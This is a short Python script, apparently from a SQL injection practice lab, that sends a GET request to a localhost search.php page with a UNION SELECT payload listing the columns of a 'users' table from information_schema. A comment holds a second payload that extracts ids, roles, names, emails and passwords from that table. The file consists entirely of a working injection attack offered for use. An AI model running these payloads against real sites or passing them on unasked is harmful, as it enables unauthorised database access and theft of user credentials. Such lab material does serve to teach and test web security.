import requests

 
# http://localhost/www/sites/eh/example1/search.php?name=s%27%20union%20select%20concat(id,role),name,%20email,password%20from%20users%20--%20
# Define the URL you want to send the GET request to
url = "http://localhost/sites/sql_injection/example2/search.php?name=apple' union select COLUMN_NAME,DATA_TYPE ,'a','a' from information_schema.columns WHERE table_name = 'users' -- "

# Send the POST request and get the response
response = requests.get(url)

# Check the response status code
if response.status_code == 200:
    # The request was successful, access the response content
    print(response.text)
else:
    # The request failed, handle the error
    print(f"Error: {response.status_code}")
